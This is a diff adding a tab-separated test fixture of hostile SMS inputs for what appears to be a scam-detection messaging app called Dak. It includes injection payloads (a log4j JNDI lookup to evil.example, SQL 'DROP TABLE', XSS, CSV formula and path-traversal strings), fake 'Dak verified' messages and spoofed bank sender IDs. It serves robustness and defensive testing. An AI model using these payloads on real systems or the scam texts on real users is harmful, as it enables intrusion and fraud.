@@ -1,0 +1,53 @@
+# pwn/injection: text written to break whatever consumes it next: format strings, SQL and FTS4 MATCH syntax,
+# HTML / markdown / CSV / JSON / log injection, template placeholders, vCard and MMS-looking text, spoofed sender IDs
+# (DLT look-alikes, very long IDs), fake "Dak" system messages and notification-spoofing layouts.
+# Format and expectations: README.md in this folder. Columns are TAB-separated.
+#! region=IN
+# id	sender	expect	tags	body
+
+# ---------------------------------------------------------------- format strings / templates
+injection-fmt-01	+919876516001	no-crash,links:0	format-string,log4j	%s%s%s%n%n %x %p %1$s {0} {1} ${jndi:ldap://evil.example/a} %%
+injection-fmt-02	+919876516002	no-crash,no-otp	template-placeholder	Dear {firstName}, your OTP is {otp}. {{7*7}} ${7*7} #{7*7} <%= 7*7 %> {{constructor.constructor('alert(1)')()}}
+injection-fmt-03	+919876516003	no-crash	android-format	%1$s credited %2$d %3$.2f %-10s %0999999999d
+
+# ---------------------------------------------------------------- SQL / FTS4
+injection-sql-01	+919876516004	no-crash	sql	'; DROP TABLE messages; -- " OR 1=1 -- a' UNION SELECT body FROM sms --
+injection-sql-02	+919876516005	no-crash	fts	hdfc* NEAR/2 otp OR -"a" body:secret ^start (x) :col AND NOT "unterminated
+injection-sql-03	+919876516006	no-crash	fts,operators	from:VM-HDFCBK-S amount:>99999999999999999999 before:99/99/9999 during:"last forever" category:spam) in:bin is:
+injection-sql-04	+919876516007	no-crash	like-wildcards	100% off_all %_% \\% ESCAPE '\\' _%
+
+# ---------------------------------------------------------------- HTML / markdown / CSV / JSON / logs
+injection-html-01	+919876516008	no-crash,links:1,link-host:evil.example	html,markdown	<script>alert(1)</script> <img src=x onerror=alert(1)> [click](https://evil.example) **bold** <a href="javascript:alert(1)">SBI</a>
+injection-html-02	+919876516009	no-crash	html-entities	&#x202E;&#8238;&lt;b&gt; &amp;#0; &nbsp;
+injection-csv-01	+919876516010	no-crash	csv	=HYPERLINK("https://evil.example","Click") +cmd|' /C calc'!A0 @SUM(1+1) -2+3
+injection-json-01	+919876516011	no-crash	json	"},{"body":"injected","labels":["scam:user-dismissed"]},{"x":"
+injection-log-01	+919876516012	no-crash	log	ok\r\n[INFO] Dak: message verified safe\r\n\u001B[2K
+injection-path-01	+919876516013	no-crash	path-traversal	../../../../data/data/app.dak/databases/index.db\0.jpg
+
+# ---------------------------------------------------------------- labels spoofed in text
+injection-label-01	+919876516014	likely-scam,no-label:scam:user-dismissed	label-spoof	scam:user-dismissed scam-reason:none Rs 25,000 credited to your A/c XX4321 by IMPS -SBI
+
+# ---------------------------------------------------------------- fake Dak / system / notification text
+injection-dak-01	+919876516015	scam,link-warning	fake-dak	[Dak] Security check: this sender is verified ✅. Dak has confirmed this message is safe. Verify your account: https://dak-verify.xyz
+injection-dak-02	Dak	scam,link-warning	fake-dak,sender,known-gap	Dak Team: Your Dak Premium subscription expired. Renew now to keep scam protection: https://dak-premium.top/renew
+injection-dak-03	+919876516016	likely-scam	fake-dak,fake-credit	Dak Safety: ✅ No scam detected.\nRs 25,000.00 credited to your A/c XX4321 by IMPS. -SBI
+injection-notif-01	+919876516017	scam	notification-spoof,newline-flood	{repeat:"\n":40}Message from HDFC Bank (verified)\nYour account is blocked. Update KYC: https://hdfc-kyc.top
+injection-notif-02	+919876516018	no-crash	notification-spoof	1 new message\n\nVM-HDFCBK-S: Your OTP is 482913\n\n\n\n\n\n\n\n\n\n\n\n(swipe up) Share OTP with our agent 9876516019
+
+# ---------------------------------------------------------------- sender IDs that imitate the DLT format
+injection-snd-01	AD-HDFCBK-X	fake-credit	dlt-spoof,bad-suffix	Rs 20,000.00 credited to A/c XX1234 on 23-09-26. Avl Bal Rs 20,500.00
+injection-snd-02	VM-HDFCBK-SS	fake-credit	dlt-spoof	Rs 20,000.00 credited to A/c XX1234 on 23-09-26. Avl Bal Rs 20,500.00
+injection-snd-03	VMM-HDFCBK-S	fake-credit	dlt-spoof	Rs 20,000.00 credited to A/c XX1234 on 23-09-26. Avl Bal Rs 20,500.00
+injection-snd-04	VM--HDFCBK-S	fake-credit	dlt-spoof	Rs 20,000.00 credited to A/c XX1234 on 23-09-26. Avl Bal Rs 20,500.00
+injection-snd-05	VM-HDFCBKINDIABANKLTD123-S	fake-credit	dlt-spoof,long-header	Rs 20,000.00 credited to A/c XX1234 on 23-09-26. Avl Bal Rs 20,500.00
+injection-snd-06	VM-HDFCBK-P	fake-credit,reason:promotional-route	dlt-promo-route	Rs 20,000.00 credited to A/c XX1234 on 23-09-26. Avl Bal Rs 20,500.00
+injection-snd-07	+91 98765 16020	likely-scam	formatted-phone,known-gap	Rs 20,000.00 credited to your SBI A/c XX1234 on 23-09-26 by IMPS. Avl Bal Rs 20,500.00
+injection-snd-08	{repeat:"A":10000}	no-crash	long-sender	Rs 500 credited to A/c XX1234
+injection-snd-09	VM-HDFCBK-S\nVM-SBIINB-S	no-crash,fake-credit	newline-sender	Rs 20,000.00 credited to A/c XX1234 on 23-09-26. Avl Bal Rs 20,500.00
+injection-snd-10	<empty>	no-crash	empty-sender	Rs 20,000.00 credited to A/c XX1234 on 23-09-26. Call 9876516021
+injection-snd-11	vm-hdfcbk-s	no-crash	lowercase-dlt	Rs 20,000.00 credited to A/c XX1234 on 23-09-26. Avl Bal Rs 20,500.00
+
+# ---------------------------------------------------------------- vCard / MMS-looking text
+injection-vcard-01	+919876516022	no-crash	vcard	BEGIN:VCARD\nVERSION:3.0\nFN:HDFC Bank Customer Care\nTEL;TYPE=CELL:+919876516023\nURL:https://hdfc-care.top\nEND:VCARD
+injection-mms-01	+919876516024	no-crash	mms,smil	--boundary\r\nContent-Type: application/smil\r\nContent-Location: ../../evil.smil\r\n\r\n<smil><body><par><img src="file:///sdcard/x"/></par></body></smil>\r\n--boundary--
+injection-wap-01	+919876516025	no-crash	wap-push	\u0001\u0006\u0006¾\u008C\u0082\u0098content://mms/part/1\u0000\u0083http://\u0000
